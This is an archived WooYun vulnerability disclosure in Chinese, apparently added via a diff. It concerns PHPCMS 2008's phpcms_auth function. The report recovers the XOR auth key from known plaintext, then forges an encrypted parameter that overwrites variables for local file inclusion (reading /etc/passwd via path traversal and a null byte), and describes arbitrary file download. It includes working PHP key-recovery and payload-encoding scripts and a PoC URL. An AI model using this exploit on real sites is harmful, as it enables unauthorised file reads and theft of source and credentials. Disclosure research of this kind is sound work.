@@ -1,0 +1,576 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/c4rp3nt3r">c4rp3nt3r</a> 
+</li><li>提交时间：		2011-04-02 13:29</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-04-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-04-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-04-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-04-26：	细节向普通白帽子公开<br/>
+									2011-05-06：	细节向实习白帽子公开<br/>
+									2011-05-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">phpcms_auth函数是phpcms里面为了增强程序的安全性的一个加密函数，用它来对用户提交的加密字符串进行解密，进入程序流程，如果我们可以控制了phpcms_auth函数的解密，我们就可以通过注射我们的恶意代码，进行攻击。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞<br />
+<br />
+<br />
+<br />
+by c4rp3nt3r@0x50sec.org<br />
+<br />
+mail: c4rp3nt3r#gmail.com<br />
+<br />
+HomePage:http://www.0x50sec.org<br />
+<br />
+<br />
+<br />
+phpcms_auth函数是phpcms里面为了增强程序的安全性的一个加密函数，在play.php、down.php 、download.php等等文件用它来对用户提交的加密字符串进行解密，进入程序流程，如果我们可以控制了phpcms_auth函数的解密，我们就可以通过注射我们的恶意代码，进行攻击。<br />
+<br />
+而phpcms_auth采用的是可逆的位异或算法，并且对加密的结果进行了base64编码。<br />
+<br />
+对于位异或算法来说只要我们破解了密钥字符串$key我们就完全控制了这个函数的加密解密。<br />
+<br />
+对于base64编码主要是处理某些加密后的不可见字符，但是这给了我们一个很好的机会:<br />
+<br />
+就是说我们破解了$key之后，我们就可以不受magic_quotes_pgc的限制引入%00字符串进行阶段，或者引入引号发起其他攻击。<br />
+<br />
+到此已经违背了这个程序设计的初衷，破解了这个函数之后，一方面反而更加不安全了，另一方面所有建立在这个函数之上的机制可能都会受到攻击。<br />
+<br />
+<br />
+<br />
+</p><pre><code>// include/global.func.php<br />
+function phpcms_auth($txt, $operation = &#039;ENCODE&#039;, $key = &#039;&#039;)<br />
+{<br />
+	$key	= $key ? $key : $GLOBALS[&#039;phpcms_auth_key&#039;];<br />
+	$txt	= $operation == &#039;ENCODE&#039; ? $txt : base64_decode($txt);<br />
+	$len	= strlen($key);<br />
+	$code	= &#039;&#039;;<br />
+	<br />
+	for($i=0; $i&lt;strlen($txt); $i++){<br />
+		$k		= $i % $len;	//循环使用密钥字符串对字符串逐位进行异或<br />
+		$code  .= $txt[$i] ^ $key[$k];<br />
+	}<br />
+	$code = $operation == &#039;DECODE&#039; ? $code : base64_encode($code);<br />
+	return $code;<br />
+}</code></pre><p class='detail'><br />
+<br />
+对于$key的破解<br />
+<br />
+对于位运算的异或运算，是可逆的，明文和密钥异或得到密文。如果我们知道密文并且知道一部分明文那么我们也就可以得到密钥，有了密钥我们就可以破解另一部分密文，当然也就可以对我们自己的明文进行加密，然后用我们精心构造的密文发起攻击了。<br />
+<br />
+<br />
+<br />
+不幸的是phpcms的确给了我们可用来破解密钥的明文。<br />
+<br />
+</p><pre><code>// include/fields/downfile/output.inc.php<br />
+<br />
+function downfile($field, $value)<br />
+{<br />
+	$contentid = $this-&gt;contentid;<br />
+	$mode = $this-&gt;fields[$field][&#039;mode&#039;];<br />
+	$result = &#039;&#039;;<br />
+	if($mode)<br />
+	{<br />
+		$servers = $this-&gt;fields[$field][&#039;servers&#039;];<br />
+		$downloadtype = $this-&gt;fields[$field][&#039;downloadtype&#039;];<br />
+		$servers = explode(&quot;\n&quot;,$servers);<br />
+		foreach($servers AS $k=&gt;$server)<br />
+		{<br />
+			$server = explode(&quot;|&quot;,$server);<br />
+			$serverurl = $server[1];<br />
+			$a_k = urlencode(phpcms_auth(&quot;i=$contentid&amp;s=$serverurl&amp;m=1&amp;f=$value&amp;d=$downloadtype&quot;, &#039;ENCODE&#039;, AUTH_KEY));<br />
+			$result .= &quot;&lt;a href=&#039;down.php?a_k=$a_k&#039; target=&#039;_blank&#039;&gt;$server[0]&lt;/a&gt;&quot;;<br />
+		}<br />
+	}<br />
+	else<br />
+	{<br />
+		$a_k = urlencode(phpcms_auth(&quot;i=$contentid&amp;m=0&amp;f=$value&quot;, &#039;ENCODE&#039;, AUTH_KEY));<br />
+		$result = &quot;&lt;a href=&#039;down.php?a_k=$a_k&#039; target=&#039;_blank&#039;&gt;点击下载&lt;/a&gt;&quot;;<br />
+	}<br />
+	return $result;<br />
+}</code></pre><p class='detail'><br />
+<br />
+这个文件是用来生成静态html文件的，默认安装的phpcms某个软件的下载页面地址为:<br />
+<br />
+http://127.0.0.1/n/phpcms/2011/0331/2.html<br />
+<br />
+<br />
+<br />
+进入下载文件的下载地址为:<br />
+<br />
+http://127.0.0.1/n/phpcms/down.php?a_k=GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D<br />
+<br />
+对加密字符串解密后为<br />
+<br />
+密文:GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D<br />
+<br />
+明文:i=2&amp;s=&amp;m=0&amp;f=uploadfile/2011/0331/20110331121233766.zip&amp;d=1<br />
+<br />
+这里2.html的2就是数据库里id的值，如果没有设置镜像站点的话$serverurl为空<br />
+<br />
+也就是说&quot;i=2&amp;s=&amp;m=1&amp;f=&quot;是不会变的，我们可以破解12位的密钥了。<br />
+<br />
+默认的话密钥有20位，如果用户上传目录没修改的话我们知道的明文就有&quot;i=2&amp;s=&amp;m=0&amp;f=uploadfile&quot;共23个字符，可以得到全部密钥了。<br />
+<br />
+</p><pre><code>&lt;?<br />
+$key=&quot;i=2&amp;s=&amp;m=0&amp;f=uploadfile&quot;;<br />
+$txt=&#039;GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D&#039;;<br />
+$txt=base64_decode(urldecode($txt));<br />
+$len=strlen($key);<br />
+echo $len;<br />
+for($i=0;$i&lt;strlen($key);$i++)<br />
+{<br />
+		$code  .= $txt[$i] ^ $key[$i];<br />
+}<br />
+echo $code;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+运行结果为:sIpeofogblFVCildZEwesIp<br />
+<br />
+可以看到sIp开始下一个循环加密了，所以密钥就是:sIpeofogblFVCildZEwe<br />
+<br />
+<br />
+<br />
+还有一点就是下载的时候我们可以得到文件名:20110331121233766.zip<br />
+<br />
+d的值是下载文件的类型，假设我们不知道也不要紧<br />
+<br />
+就是说明文:20110331121233766.zip&amp;d=是已知的有24位<br />
+<br />
+密文:GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D<br />
+<br />
+</p><pre><code>&lt;?<br />
+$key=&quot;20110331121233766.zip&amp;d=&quot;;<br />
+$txt=&#039;GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D&#039;;<br />
+<br />
+$txt=base64_decode(urldecode($txt));<br />
+$tlen=strlen($txt);<br />
+$klen=strlen($key);<br />
+for($i=1;$i&lt;strlen($key);$i++)<br />
+{<br />
+		$code  .= $txt[$tlen-$i-1] ^ $key[$klen-$i];<br />
+}<br />
+echo $code.&quot;\n&quot;;<br />
+echo $tlen.&quot;\n&quot;;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+运行结果为:<br />
+<br />
+EZdliCVFlbgofoepIsewEZd<br />
+<br />
+59<br />
+<br />
+来看phpcms_auth源码<br />
+<br />
+</p><pre><code>/*<br />
+...<br />
+	$len	= strlen($key);<br />
+...<br />
+<br />
+	for($i=0; $i&lt;strlen($txt); $i++){<br />
+		$k		= $i % $len;<br />
+		$code  .= $txt[$i] ^ $key[$k];<br />
+	}<br />
+...<br />
+*/</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们可以知道<br />
+<br />
+$key[17]=&#039;E&#039;;<br />
+<br />
+我们可以得到倒序的密钥字符串:<br />
+<br />
+ewEZdliCVFlbgofoepIs<br />
+<br />
+<br />
+<br />
+然后我们把字符串翻转过来终端下执行：<br />
+<br />
+<br />
+<br />
+alone@Sh3llc0de:~$ echo &#039;ewEZdliCVFlbgofoepIs&#039;|rev<br />
+<br />
+sIpeofogblFVCildZEwe<br />
+<br />
+<br />
+<br />
+我们的密钥字符串就是:sIpeofogblFVCildZEwe<br />
+<br />
+<br />
+<br />
+到此我们已经从一个攻击者的角度破解出了密钥。接下来我们看看由此引发的几个安全问题<br />
+<br />
+-------------------------------------<br />
+<br />
+<br />
+<br />
+1.phpcms2008 sp2-sp4 本地文件包含漏洞<br />
+<br />
+这个漏洞跟boblog刚爆出的任意变量覆盖漏洞有些相似，都是任意变量覆盖然后仅跟了一个本地文件包含。这种漏洞也是很好玩的，攻击的方法更灵活。<br />
+<br />
+</p><pre><code>//play.php<br />
+&lt;?php<br />
+require dirname(__FILE__).&#039;/include/common.inc.php&#039;;<br />
+if(!isset($a_k)) showmessage($LANG[&#039;illegal_parameters&#039;]);<br />
+//common.inc.php文件的全局变量机制已经将所有GPC数据导出为变量了<br />
+//所以$a_k=$_GET[$a_k];<br />
+$a_k = phpcms_auth($a_k, &#039;DECODE&#039;, AUTH_KEY); //这里是关键分析见上文<br />
+<br />
+if(empty($a_k)) showmessage($LANG[&#039;illegal_parameters&#039;]);<br />
+unset($i, $m, $f, $p);<br />
+parse_str($a_k);	//parse_str处理解密后的$a_k将导致变量覆盖<br />
+					//通过覆盖下文的$mod 或者$templateid将触发本地文件包含漏洞<br />
+					//由于我们提交的密文会经过phpcms_auth函数中base64解密的，所以直接无视magic_quotes_gpc的影响而可以NULL字符截断<br />
+					//但是高版本的PHP修复了%00的攻击缺陷<br />
+					<br />
+if(isset($i)) $i = intval($i);<br />
+if(!isset($m)) showmessage($LANG[&#039;illegal_parameters&#039;]);<br />
+<br />
+if(empty($f)) showmessage(&#039;地址失效&#039;);<br />
+if(preg_match(&#039;/\.php$/&#039;,$f) || strpos($f, &quot;:\\&quot;)) showmessage(&#039;地址有误&#039;);<br />
+if(!$i || $m&lt;0) showmessage($LANG[&#039;illegal_parameters&#039;]);<br />
+$allow_readpoint = 1;<br />
+// include global.fuc.php<br />
+/*<br />
+...<br />
+$M = $TEMP = array();<br />
+if(!isset($mod)) $mod = &#039;phpcms&#039;;<br />
+if($mod != &#039;phpcms&#039;)<br />
+{<br />
+	isset($MODULE[$mod]) or exit($LANG[&#039;module_not_exists&#039;]);<br />
+	$langfile = defined(&#039;IN_ADMIN&#039;) ? $mod.&#039;_admin&#039; : $mod;<br />
+	@include PHPCMS_ROOT.&#039;languages/&#039;.LANG.&#039;/&#039;.$langfile.&#039;.lang.php&#039;;<br />
+	$M = cache_read(&#039;module_&#039;.$mod.&#039;.php&#039;);<br />
+}<br />
+...<br />
+*/<br />
+//此处通过上文的对$mod进行变量覆盖绕过下面的if语句<br />
+if($mod == &#039;phpcms&#039;)<br />
+{<br />
+	$contentid = $i;<br />
+	include &#039;admin/content.class.php&#039;;<br />
+	$content = new content;<br />
+	$data = $content-&gt;get($contentid);<br />
+	$readpoint = $data[&#039;readpoint&#039;];<br />
+<br />
+	$title = $data[&#039;title&#039;];<br />
+	$keys = array_keys($data);<br />
+<br />
+	if(in_array(&#039;groupids_view&#039;,$keys))<br />
+	{<br />
+		if($data[&#039;groupids_view&#039;])<br />
+		{<br />
+			if(!$priv_group-&gt;check(&#039;contentid&#039;, $contentid, &#039;view&#039;, $_groupid)) showmessage(&#039;您没有查看权限&#039;);<br />
+		}<br />
+		if(in_array(&#039;readpoint&#039;, $keys))<br />
+		{<br />
+			$C = cache_read(&#039;category_&#039;.$data[&#039;catid&#039;].&#039;.php&#039;);<br />
+			if($C[&#039;defaultchargepoint&#039;] || !empty($readpoint))<br />
+			{<br />
+				$readpoint = $readpoint ? $readpoint : $C[&#039;defaultchargepoint&#039;];<br />
+				$pay = load(&#039;pay_api.class.php&#039;, &#039;pay&#039;, &#039;api&#039;);<br />
+				if($C[&#039;repeatchargedays&#039;])<br />
+				{<br />
+					if($pay-&gt;is_exchanged($contentid, $C[&#039;repeatchargedays&#039;]) === FALSE)<br />
+					{<br />
+						$allow_readpoint = 0;<br />
+					}<br />
+				}<br />
+				else<br />
+				{<br />
+					session_start();<br />
+					if($_SESSION[&#039;pay_contentid&#039;] != $contentid) $allow_readpoint = 0;<br />
+				}<br />
+			}<br />
+		}<br />
+	}<br />
+}<br />
+<br />
+<br />
+$player = load(&#039;player.class.php&#039;);<br />
+$result = $player-&gt;get($p);<br />
+@extract($result);<br />
+$videourl = trim($f);<br />
+$code = str_replace(&#039;{$filepath}&#039;,$videourl, $code);<br />
+$code = str_replace(&#039;{$PHPCMS[siteurl]}&#039;, $PHPCMS[&#039;siteurl&#039;], $code);<br />
+$code = str_replace(&#039;{$PHPCMS[sitename]}&#039;, $PHPCMS[&#039;sitename&#039;], $code);<br />
+$templateid = $templateid ? $templateid : &#039;play&#039;;<br />
+include template($mod, $templateid);<br />
+/*<br />
+// include/global.fuc.php<br />
+// function template 起到一个连接字符串的作用<br />
+<br />
+function template($module = &#039;phpcms&#039;, $template = &#039;index&#039;, $istag = 0)<br />
+{<br />
+	$compiledtplfile = TPL_CACHEPATH.$module.&#039;_&#039;.$template.&#039;.tpl.php&#039;;<br />
+	if(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.&#039;/&#039;.$module.&#039;/&#039;.$template.&#039;.html&#039;) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.&#039;/tag.inc.php&#039;) &gt; @filemtime($compiledtplfile)))<br />
+	{<br />
+		require_once PHPCMS_ROOT.&#039;include/template.func.php&#039;;<br />
+		template_compile($module, $template, $istag);<br />
+	}<br />
+	return $compiledtplfile;<br />
+}<br />
+<br />
+*/<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+接下来生成我们的攻击字符串:<br />
+<br />
+&lt;?php<br />
+<br />
+$key=&#039;sIpeofogblFVCildZEwe&#039;;<br />
+<br />
+$evil=&#039;i=1&amp;m=1&amp;f=fuck&amp;mod=../../../../../../../etc/passwd%00&amp;c4rp3nt3r=0x50sec.org&#039;;<br />
+<br />
+//经过parse_str($evil);后c4rp3nt3r变量并没有被创建<br />
+<br />
+//这个地方我也不是很明白为什么可以进行截断<br />
+<br />
+//但事实上真的可以截断<br />
+<br />
+<br />
+<br />
+$evil = phpcms_auth($evil, &#039;ENCODE&#039;, $key);<br />
+<br />
+echo $evil.&quot;\n&quot;;<br />
+<br />
+function phpcms_auth($txt, $operation = &#039;ENCODE&#039;, $key)<br />
+<br />
+{<br />
+<br />
+	$txt	= $operation == &#039;ENCODE&#039; ? $txt : base64_decode($txt);<br />
+<br />
+	$len	= strlen($key);<br />
+<br />
+	$code	= &#039;&#039;;<br />
+<br />
+	<br />
+<br />
+	for($i=0; $i&lt;strlen($txt); $i++){<br />
+<br />
+		$k		= $i % $len;<br />
+<br />
+		$code  .= $txt[$i] ^ $key[$k];<br />
+<br />
+	}<br />
+<br />
+	$code = $operation == &#039;DECODE&#039; ? $code : base64_encode($code);<br />
+<br />
+	return $code;<br />
+<br />
+}<br />
+<br />
+?&gt;<br />
+<br />
+<br />
+<br />
+alone@Sh3llc0de:/var/www$ php v.php<br />
+<br />
+GnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsL<br />
+<br />
+<br />
+<br />
+POC：http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsL<br />
+<br />
+成功包含了/etc/passwd<br />
+<br />
+<br />
+<br />
+2.phpcms2008 sp2-sp4、PHPCMS V9 正式版任意文件下载漏洞<br />
+<br />
+<br />
+<br />
+以phpcms2008为例<br />
+<br />
+<br />
+<br />
+down.php 和download.php都存在这个漏洞，具体利用跟上面的文件包含差不多就不多罗嗦了，成功利用此漏洞可以下载任意文件，包括.php后缀的文件。<br />
+<br />
+只是download.php的加密方式是：<br />
+<br />
+//download.php<br />
+<br />
+...<br />
+<br />
+$phpcms_auth_key = md5(AUTH_KEY.$_SERVER[&#039;HTTP_USER_AGENT&#039;]);<br />
+<br />
+<br />
+<br />
+$a_k = phpcms_auth($a_k, &#039;DECODE&#039;, $phpcms_auth_key);<br />
+<br />
+...<br />
+<br />
+这样可能主要是为了仿制迅雷等浏览器的下载。但是既然我们知道了AUTH_KEY(见上文分析的密钥$key),$_SERVER[&#039;HTTP_USER_AGENT&#039;]是由用户提交的，那么$phpcms_auth_key 我们自然也就知道了。<br />
+<br />
+除了上面说的知道部分明文来算$key，还有可能暴力破解$key.<br />
+<br />
+还有就是经过md5加密后也未必就更安全，因为系统生成的$key有20位但是每一位都肯能个是大写或者小写字母，也就是有52种可能，但是经过md5加密后每一位就变成只有16种可能了，大大增加了被暴力破解的可能性。<br />
+<br />
+<br />
+<br />
+全文结束<br />
+<br />
+参考和致谢:<br />
+<br />
+80vul.com《高级PHP应用程序漏洞审核技术》<br />
+<br />
+Ryat[puretot] 《bo-blog任意变量覆盖漏洞》<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>POC：http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsL</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/0213284246e721c76a2bd4fae39115602eeb30e0.png" target="_blank"><img src="../images/0213284246e721c76a2bd4fae39115602eeb30e0.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">略 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/c4rp3nt3r" title="c4rp3nt3r">c4rp3nt3r</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-01795" title="phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2011-04-06 10:05</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢c4rp3nt3r提交漏洞。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="1795";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
